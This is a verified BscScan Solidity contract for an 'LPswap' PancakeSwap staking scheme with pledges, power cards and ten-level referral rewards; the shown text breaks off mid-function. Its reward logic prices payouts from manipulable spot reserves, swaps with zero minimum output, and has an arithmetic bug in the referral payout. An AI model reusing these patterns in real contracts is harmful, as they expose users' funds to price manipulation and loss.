/**
 *Submitted for verification at BscScan.com on 2022-05-24
*/

pragma solidity >=0.6.6;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;

    function INIT_CODE_PAIR_HASH() external view returns (bytes32);
}



interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}


library PancakeLibrary {
    using SafeMath for uint;

    // returns sorted token addresses, used to handle return values from pairs sorted in this order
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'PancakeLibrary: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'PancakeLibrary: ZERO_ADDRESS');
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                // hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
                hex'ecba335299a6693cb2ebc4782e74669b84290b6378ea3a3873c7231a8d7d1074'   // testnet
            ))));
    }

    // fetches and sorts the reserves for a pair
    function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) {
        (address token0,) = sortTokens(tokenA, tokenB);
        pairFor(factory, tokenA, tokenB);
        (uint reserve0, uint reserve1,) = IPancakePair(pairFor(factory, tokenA, tokenB)).getReserves();
        (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);
    }

    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset
    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
        require(amountA > 0, 'PancakeLibrary: INSUFFICIENT_AMOUNT');
        require(reserveA > 0 && reserveB > 0, 'PancakeLibrary: INSUFFICIENT_LIQUIDITY');
        amountB = amountA.mul(reserveB) / reserveA;
    }

    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        require(amountIn > 0, 'PancakeLibrary: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'PancakeLibrary: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn.mul(998);
        uint numerator = amountInWithFee.mul(reserveOut);
        uint denominator = reserveIn.mul(1000).add(amountInWithFee);
        amountOut = numerator / denominator;
    }

    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {
        require(amountOut > 0, 'PancakeLibrary: INSUFFICIENT_OUTPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'PancakeLibrary: INSUFFICIENT_LIQUIDITY');
        uint numerator = reserveIn.mul(amountOut).mul(1000);
        uint denominator = reserveOut.sub(amountOut).mul(998);
        amountIn = (numerator / denominator).add(1);
    }

    // performs chained getAmountOut calculations on any number of pairs
    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {
        require(path.length >= 2, 'PancakeLibrary: INVALID_PATH');
        amounts = new uint[](path.length);
        amounts[0] = amountIn;
        for (uint i; i < path.length - 1; i++) {
            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);
            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);
        }
    }

    // performs chained getAmountIn calculations on any number of pairs
    function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) {
        require(path.length >= 2, 'PancakeLibrary: INVALID_PATH');
        amounts = new uint[](path.length);
        amounts[amounts.length - 1] = amountOut;
        for (uint i = path.length - 1; i > 0; i--) {
            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);
            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);
        }
    }
}

library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }
    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }
    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0, 'ds-math-div-overflow');
        uint c = a / b;
        return c;
    }
}
library SafeMath256 {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
//0x9d2bbd9113767121eed07b208c4b10a03602ac9b address
//0x9b3ddcf554df93b27774e3ec40839b8453ca0f8d address


contract LPswap {

    // using SafeMath for uint;
    using SafeMath256 for uint256;

    address public _factory;
    address public _router;
    IPancakeFactory public Factory;//0xB7926C0430Afb07AA7DEfDE6DA862aE0Bde767bc //0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
    IPancakeRouter02 public Router;//0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 //0x10ED43C718714eb63d5aA57B78B54704E256024E
    address public usdtToken;//0x461cC05c887D7A5cDf03e530C631f4c329F30F91 //0x55d398326f99059fF775485246999027B3197955
    // address public xqtToken ;//0x7E2752E4864d22c68c9664154177C0B1809F827f   //0xC9882dEF23bc42D53895b8361D0b1EDC7570Bc6A
    address public martToken ;//0x6A960476a39b9B65A63c721cdEEa2B80dF706650  //0xDaC328078613a95EC63dF19AbcBe66d65646A6EF
    address public owner;
    uint256 public usdtToken_decimals;
    uint256 public martToken_decimals;
    uint256 public pledgeNode_price;
    uint256 public pledgeUser_price;
    uint256 public init_mart;
    address public pair;

    uint256 public miner_day = 5;
    uint256 public fee_rate = 5;
    uint256 public node_rate = 5;
    uint256 public usdt_rate = 30;
    uint256 public mart_rate = 60;

    uint256 public mart_fee_rate = 10;
    uint256 public pledge_count = 0;
    uint256 public card_num = 200;
    uint256 public card_power = 100*1000000000000000000;
    uint256 public super_node_rate = 30;

    bool public pledge_node_switch;
    bool public pledge_user_switch;

    mapping (address => bool) public pledge_node;
    mapping (address => bool) public pledge_user;
    // mapping (address => Miner[]) public user_miner;

    mapping (address => TradeToken) public trade_token;
    mapping (address => Power) public user_power;
    mapping (address => PledgeLP) public pledge_lp;
    mapping (address => address) public releation;

    struct TradeToken{
        address addrs;
        uint256 moneys;
        uint256 rate;
        uint256 proportion;
    }

    struct Node{
        address addrs;
        uint256 moneys;
    }

    struct Miner{
        address token;
    }

    struct Power{
        address addrs;
        uint256 power;
        uint256 use_power;
        bool is_stop;
    }

    Node[] public pledge_node_arr;

    struct PledgeLP{
        address addrs;
        uint256 release;
        uint256 total;
        uint256 origin;
        uint256 miner_power;
        uint256 use_power;
        uint256 actual_power;
        uint256 release_second;
        uint256 receive_time;
        uint256 miner_time;
        uint256 count;
        uint256 last_pledge;
        bool is_end;
    }

    event AddMinerPool(uint256 input_amount,address _addr,uint256 quote,uint256 mart_amount);
    event PledgeNode(address user,uint256 amount);
    event PledgeUser(address user,uint256 amount);
    event TradToken(address _addr,uint256 _amount,uint256 _rate,uint256 _proportion);

    constructor() public {
        _factory = 0xB7926C0430Afb07AA7DEfDE6DA862aE0Bde767bc;
        _router = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
        Factory = IPancakeFactory(_factory);
        Router = IPancakeRouter02(_router);
        usdtToken = 0x461cC05c887D7A5cDf03e530C631f4c329F30F91;
        martToken = 0x6A960476a39b9B65A63c721cdEEa2B80dF706650;
        owner = msg.sender;
        usdtToken_decimals = IERC20(usdtToken).decimals();
        martToken_decimals = IERC20(martToken).decimals();
        pledgeNode_price = 100000000;
        pledgeUser_price = 10000000;
        init_mart = 3000000;
        pledge_node_switch = true;
        pledge_user_switch = true;
        pair = PancakeLibrary.pairFor(_factory,usdtToken,martToken);
    }


    function setInitMart(uint256 _init_mart) public  {
        require(msg.sender == owner, "LP: only owner");
        init_mart = _init_mart;
    }

    function setRelation(address _addr) public {
        require(releation[msg.sender] == address(0) , "LP: recommender already exists ");
        if(msg.sender==owner){
            releation[msg.sender] = 0x000000000000000000000000000000000000dEaD;
        }else{
            if(_addr==owner){
                releation[msg.sender] = _addr;
            }else{
                address pre = releation[_addr];
                require(pre != address(0) , "LP: recommender not exists ");
                releation[msg.sender] = _addr;
            }
        }
    }

    function setTrade(address _addr,uint256 _amount,uint256 _rate,uint256 _proportion) public {
        require(msg.sender == owner, "LP: only owner");
        // require(trade_token[_addr].addrs == address(0), "LP: trade already exists");
        (uint reserveA, uint reserveB) = PancakeLibrary.getReserves(address(Factory),usdtToken,_addr);
        if(!(reserveA>0&&reserveB>0)){
            revert('error token address');
        }
        trade_token[_addr].addrs = _addr;
        trade_token[_addr].moneys = _amount;
        trade_token[_addr].rate = _rate;
        trade_token[_addr].proportion = _proportion;
        emit TradToken(_addr,_amount,_rate,_proportion);
    }

    function setCardNum(uint256 _card_num) public{
        require(msg.sender == owner, "LP: only owner");
        card_num = _card_num;
    }

    function setCardPower(uint256 _card_power) public{
        require(msg.sender == owner, "LP: only owner");
        card_power = _card_power  * 10 ** usdtToken_decimals;
    }

    function powerCard(uint256 _card_num) public {
        require(_card_num>=1, "LP: card_num min 1");
        require(_card_num<=10, "LP: card_num max 10");
        card_num = card_num.sub(_card_num);
        require(card_num>=0, "LP: card_num insufficient quantity");
        uint256 _input_amount = _card_num * 10 ** usdtToken_decimals;
        IERC20(usdtToken).transferFrom(msg.sender,pair, _input_amount);
        IPancakePair(pair).sync();
        if(user_power[msg.sender].addrs==address(0)){
            user_power[msg.sender].addrs = msg.sender;
            user_power[msg.sender].power = _card_num.mul(card_power);
            user_power[msg.sender].use_power = _card_num.mul(card_power);
        }else{
            user_power[msg.sender].power = user_power[msg.sender].power.add(_card_num.mul(card_power));
            user_power[msg.sender].use_power = user_power[msg.sender].use_power.add(_card_num.mul(card_power));
        }
        if(pledge_lp[msg.sender].addrs!=address(0)){
            uint256 actual_power = 0;
            if(pledge_lp[msg.sender].use_power.sub(pledge_lp[msg.sender].actual_power)>=user_power[msg.sender].use_power){
                actual_power = user_power[msg.sender].use_power;
                user_power[msg.sender].use_power = 0;
            }else{
                actual_power = user_power[msg.sender].use_power.sub(pledge_lp[msg.sender].use_power.sub(pledge_lp[msg.sender].actual_power));
                user_power[msg.sender].use_power = user_power[msg.sender].use_power.sub(actual_power);
            }
            pledge_lp[msg.sender].actual_power = pledge_lp[msg.sender].actual_power.add(actual_power);
            user_power[msg.sender].is_stop = true;
        }
    }

    function setPledgePrice(uint256 _pledgeNode_price,uint256 _pledgeUser_price) public  {
        require(msg.sender == owner, "LP: only owner");
        require(_pledgeNode_price > 0, "price too low");
        require(_pledgeNode_price > 0, "price too low");
        pledgeNode_price = _pledgeNode_price;
        pledgeUser_price = _pledgeUser_price;
    }

    function pledgeNodeSwitch(bool _Is) public{
        require(msg.sender == owner, "LP: only owner");
        pledge_node_switch = _Is;
    }

    function pledgeUserSwitch(bool _Is) public{
        require(msg.sender == owner, "LP: only owner");
        pledge_user_switch = _Is;
    }

    function pledgeNode() public{
        require(pledge_node_switch == true, "LP: switch none");
        require(pledge_node[msg.sender] == false, "LP: already pledge");
        require(IERC20(martToken).balanceOf(msg.sender)>=pledgeNode_price, "LP: Insufficient funds ");
        IERC20(martToken).transferFrom(msg.sender, address(this), pledgeNode_price);
        pledge_node[msg.sender] = true;
        pledge_node_arr.push(Node(msg.sender,pledgeNode_price));
        pledge_count = pledge_count.add(1);
        emit PledgeNode(msg.sender,pledgeNode_price);
    }

    function pledgeUser() public{
        require(pledge_user_switch == true, "LP: switch none");
        require(pledge_user[msg.sender] == false, "LP: already pledge");
        require(IERC20(martToken).balanceOf(msg.sender)>=pledgeUser_price, "LP: Insufficient funds ");
        IERC20(martToken).transferFrom(msg.sender, address(this), pledgeUser_price);
        pledge_user[msg.sender] = true;
        emit PledgeUser(msg.sender,pledgeUser_price);
    }

    function getReserves(address _addr) public view returns (uint reserveA, uint reserveB) {
        return PancakeLibrary.getReserves(address(Factory),usdtToken,_addr);
    }

    function quote(uint amountA,address _addr) public view returns (uint256 amountB) {
        (uint reserveA, uint reserveB) = PancakeLibrary.getReserves(address(Factory),usdtToken,_addr);
        uint256 _usdtToken_decimals = 10 ** usdtToken_decimals;
        return amountB = amountA.mul(reserveB) / reserveA.div(_usdtToken_decimals);
    }

    function AddMinerPower(uint256 input_amount,address _addr) public {
        require(input_amount>=10, "LP: input_amount must be a multiple of 10");
        require(input_amount%10==0, "LP: input_amount must be a multiple of 10");
        require(trade_token[_addr].addrs != address(0), "LP: trade failed");
        require(trade_token[_addr].moneys > input_amount, "LP: amount max");
        if(pledge_lp[msg.sender].addrs!=address(0)){
            uint256 time = block.timestamp.sub(pledge_lp[msg.sender].miner_time).div(86400);
            if(miner_day>time){
                revert('LP: time error');
            }
        }
        uint256 _quote = quote(input_amount,_addr); 
        require(IERC20(_addr).balanceOf(msg.sender)>=_quote, "LP: Insufficient funds ");
        IERC20(_addr).transferFrom(msg.sender,address(this), _quote);
        community_rewards(_quote,_addr);
        uint256 _input_amount = input_amount * 10 ** usdtToken_decimals;
        uint256 _multiple = input_amount.div(10).sub(1);
        uint256 mart_price = 0;
        if(_multiple>0){
            mart_price = _multiple.mul(init_mart);
            IERC20(martToken).transferFrom(msg.sender,address(this), mart_price);
        }
        IERC20(usdtToken).transferFrom(msg.sender,pair, _input_amount);
        IPancakePair(pair).sync();
        // user_miner[msg.sender].push(_addr);//设置用户miner  token
        uint256 total = input_amount.mul(2).mul(trade_token[_addr].proportion).mul(10**usdtToken_decimals);
        if(pledge_lp[msg.sender].addrs==address(0)||pledge_lp[msg.sender].is_end==true){
            pledge_lp[msg.sender].addrs = msg.sender;
            pledge_lp[msg.sender].release = 0;
            pledge_lp[msg.sender].total = total;
            pledge_lp[msg.sender].origin = total;
            pledge_lp[msg.sender].miner_power = total;
            pledge_lp[msg.sender].use_power = total;
            pledge_lp[msg.sender].actual_power = 0;
            pledge_lp[msg.sender].release_second = total.mul(trade_token[_addr].rate).div(100).div(86400);
            pledge_lp[msg.sender].receive_time = block.timestamp;
            if(pledge_lp[msg.sender].addrs==address(0)){
                pledge_lp[msg.sender].miner_time = block.timestamp-86400;
                pledge_lp[msg.sender].count = 1;
            }else{
                pledge_lp[msg.sender].miner_time = block.timestamp;
                pledge_lp[msg.sender].count = pledge_lp[msg.sender].count.add(1);
            }
            // pledge_lp[msg.sender].is_end = true;
        }else{
            pledge_lp[msg.sender].total = pledge_lp[msg.sender].total.add(total);
            pledge_lp[msg.sender].origin = pledge_lp[msg.sender].origin.add(total);
            pledge_lp[msg.sender].miner_power = pledge_lp[msg.sender].miner_power.add(total);
            pledge_lp[msg.sender].use_power = pledge_lp[msg.sender].use_power.add(total);
            pledge_lp[msg.sender].release_second = pledge_lp[msg.sender].release_second.add(total.mul(trade_token[_addr].rate).div(100).div(86400));
            pledge_lp[msg.sender].receive_time = pledge_lp[msg.sender].receive_time.add(block.timestamp.sub(pledge_lp[msg.sender].receive_time).mul(total).div(pledge_lp[msg.sender].total)) ;
            pledge_lp[msg.sender].miner_time = block.timestamp;
            pledge_lp[msg.sender].count = pledge_lp[msg.sender].count.add(1);
        }
        pledge_lp[msg.sender].last_pledge = total;
        if(user_power[msg.sender].use_power<=0){
            user_power[msg.sender].is_stop = false;
        }
        if(user_power[msg.sender].is_stop){
            uint256 actual_power = 0;
            if(total>user_power[msg.sender].use_power){
                actual_power = user_power[msg.sender].use_power;
                user_power[msg.sender].use_power = 0;
            }else{
                actual_power = total;
                user_power[msg.sender].use_power = user_power[msg.sender].use_power.sub(actual_power);
            }
            pledge_lp[msg.sender].actual_power = pledge_lp[msg.sender].actual_power.add(actual_power);
            // pledge_lp[msg.sender].is_end = true;
            user_power[msg.sender].is_stop = true;
        }
        emit AddMinerPool(input_amount,_addr,_quote,mart_price);
    }

    function receiveProfit() public {
        require(pledge_lp[msg.sender].addrs == msg.sender, "LP: trade failed");
        require(pledge_lp[msg.sender].is_end == false, "LP: receive end");
        require(pledge_lp[msg.sender].actual_power > 0 , "LP: insufficient computing power");
        if(block.timestamp.sub(pledge_lp[msg.sender].miner_time)>86400){
            revert('A pledge within 24 hours can receive twice the amount');
        }
        uint256 amount = block.timestamp.sub(pledge_lp[msg.sender].receive_time).mul(pledge_lp[msg.sender].release_second);
        if(pledge_lp[msg.sender].actual_power<pledge_lp[msg.sender].use_power){
            amount = amount.mul(pledge_lp[msg.sender].actual_power).div(pledge_lp[msg.sender].use_power);
        }
        pledge_lp[msg.sender].receive_time = block.timestamp;
        uint256 old_release = pledge_lp[msg.sender].release;
        pledge_lp[msg.sender].release = pledge_lp[msg.sender].release.add(amount);
        if(pledge_lp[msg.sender].release > pledge_lp[msg.sender].origin){
            amount = pledge_lp[msg.sender].origin.sub(old_release);
            pledge_lp[msg.sender].release = pledge_lp[msg.sender].origin;
            pledge_lp[msg.sender].is_end = true;
        }
        pledge_lp[msg.sender].total = pledge_lp[msg.sender].total.sub(amount);
        (uint reserveA, uint reserveB) = PancakeLibrary.getReserves(address(Factory),usdtToken,martToken);
        uint256 _quote = amount.mul(reserveB) / reserveA;
        pledge_lp[msg.sender].actual_power = pledge_lp[msg.sender].actual_power.sub(_quote); // 实时扣除算力
        pledge_lp[msg.sender].use_power = pledge_lp[msg.sender].use_power.sub(_quote); // 实时扣除预使用算力
        uint256 node_amount = _quote.mul(node_rate).div(100);
        uint256 usdt_amount = _quote.mul(usdt_rate).div(100);
        uint256 mart_amount = _quote.mul(mart_rate).div(100).mul(mart_fee_rate).div(100);
        address[] memory path;
        path = new address[](2);
        path[0] = martToken;
        path[1] = usdtToken;
        IERC20(martToken).approve(_router, usdt_amount); // 授权mart
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(usdt_amount,0,path,msg.sender,block.timestamp); // 给U 
        IERC20(martToken).transfer(msg.sender, mart_amount); // 给mart
        node_rewards(node_amount,martToken);
    }

    function getOrigin() public view returns(uint256 a){
        uint256 amount = block.timestamp.sub(pledge_lp[msg.sender].receive_time).mul(pledge_lp[msg.sender].release_second);
        if(pledge_lp[msg.sender].actual_power<pledge_lp[msg.sender].use_power){
            amount = amount.mul(pledge_lp[msg.sender].actual_power).div(pledge_lp[msg.sender].use_power);
        }
        return amount;
    }

    function getAmount1() public view returns(uint256 a){
        uint256 amount = block.timestamp.sub(pledge_lp[msg.sender].receive_time).mul(pledge_lp[msg.sender].release_second);
        if(pledge_lp[msg.sender].actual_power<pledge_lp[msg.sender].use_power){
            amount = amount.mul(pledge_lp[msg.sender].actual_power).div(pledge_lp[msg.sender].use_power);
        }
        (uint reserveA, uint reserveB) = PancakeLibrary.getReserves(address(Factory),usdtToken,martToken);
        return amount.mul(reserveB) / reserveA;
    }

    function getAmount2(uint256 amount) public view returns(uint256 a){
        (uint reserveA, uint reserveB) = PancakeLibrary.getReserves(address(Factory),usdtToken,martToken);
        return amount.mul(reserveB) / reserveA;
    }

    // function receiveTransfer2(uint256 amount) public {
    //     IERC20(martToken).approve(_router, amount); // 给mart
    //     address[] memory path;
    //     path = new address[](2);
    //     path[0] = martToken;
    //     path[1] = usdtToken;
    //     Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount,0,path,msg.sender,block.timestamp); // 给U 
    // }

    function receiveProfitA() public {
        require(pledge_lp[msg.sender].addrs == msg.sender, "LP: trade failed");
        require(pledge_lp[msg.sender].is_end == false, "LP: receive end");
        require(pledge_lp[msg.sender].actual_power > 0 , "LP: insufficient computing power");
        if(block.timestamp.sub(pledge_lp[msg.sender].miner_time)>86400){
            revert('A pledge within 24 hours can receive twice the amount');
        }
        uint256 amount = block.timestamp.sub(pledge_lp[msg.sender].receive_time).mul(pledge_lp[msg.sender].release_second);
        if(pledge_lp[msg.sender].actual_power<pledge_lp[msg.sender].use_power){
            amount = amount.mul(pledge_lp[msg.sender].actual_power).div(pledge_lp[msg.sender].use_power);
        }
        pledge_lp[msg.sender].receive_time = block.timestamp;
        uint256 old_release = pledge_lp[msg.sender].release;
        pledge_lp[msg.sender].release = pledge_lp[msg.sender].release.add(amount);
        if(pledge_lp[msg.sender].release > pledge_lp[msg.sender].origin){
            amount = pledge_lp[msg.sender].origin.sub(old_release);
            pledge_lp[msg.sender].release = pledge_lp[msg.sender].origin;
            pledge_lp[msg.sender].is_end = true;
        }
        pledge_lp[msg.sender].total = pledge_lp[msg.sender].total.sub(amount);
        (uint reserveA, uint reserveB) = PancakeLibrary.getReserves(address(Factory),usdtToken,martToken);
        uint256 _quote = amount.mul(reserveB) / reserveA;
        pledge_lp[msg.sender].actual_power = pledge_lp[msg.sender].actual_power.sub(_quote); // 实时扣除算力
        pledge_lp[msg.sender].use_power = pledge_lp[msg.sender].use_power.sub(_quote); // 实时扣除预使用算力
        address[] memory path;
        path = new address[](2);
        path[0] = martToken;
        path[1] = usdtToken;
        IERC20(martToken).approve(_router, amount); // 给mart
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount,0,path,msg.sender,block.timestamp); // 给U 
    }

    function node_rewards(uint256 _amount,address _addr) private{
        if(pledge_count>0){
            uint256 release = _amount.div(pledge_count);
            for (uint i = 0; i < pledge_node_arr.length; i++) {
                IERC20(_addr).transfer(pledge_node_arr[i].addrs, release);
            }
        }
    }

    function community_rewards(uint256 _amount,address _addr) private{
        uint256 super_node_amount = _amount.mul(super_node_rate).div(100);
        if(super_node_amount>0){
            node_rewards(super_node_amount,_addr);
        }
        uint256 super_com_amount = _amount.sub(super_node_amount);
        if(super_com_amount>0){
            uint256 super_com_amount_single = super_com_amount.div(10);
            address pre = releation[msg.sender];
            address com_addr = address(0);
            for (uint i = 0; i < 10; i++) {
                if(pre==address(0)){
                    break;
                }
                if(com_addr==address(0)){
                    if(pledge_user[pre]) com_addr = pre;
                }
                //订单数量大于
                if(pledge_lp[pre].count>i){
                    IERC20(_addr).transfer(pre, super_com_amount_single);
                    super_com_amount = super_com_amount.sub(super_com_amount);
                }
                pre = releation[pre];
            }
            if(super_com_amount>0){
                if(com_addr==address(0)){
                    bool is_true = true;
                    uint index = 0 ; 
                    while(is_true){
                        index++;
                        if(index>=100){
                            break;
                        }
                        pre = releation[pre];
                        if(pledge_user[pre]) com_addr = pre;
                        if(pre==address(0)){
                            break;
                        }
                        if(com_addr!=address(0)){
                            is_true = false;
                            IERC20(_addr).transfer(com_addr, super_com_amount);
                        }
                    }
                }else{
                    IERC20(_addr).transfer(com_addr, super_com_amount);
                }
            }
        }
    }

    function AddPoolPrice(uint256 input_amount) public {
        uint256 _input_amount = input_amount * 10 ** usdtToken_decimals;
        IERC20(usdtToken).transferFrom(msg.sender,pair, _input_amount);
        IPancakePair(pair).sync();
    }
    
    function AddPoolMartPrice(uint256 input_amount) public {
        uint256 _input_amount = input_amount * 10 ** martToken_decimals;
        IERC20(martToken).transferFrom(msg.sender,pair, _input_amount);
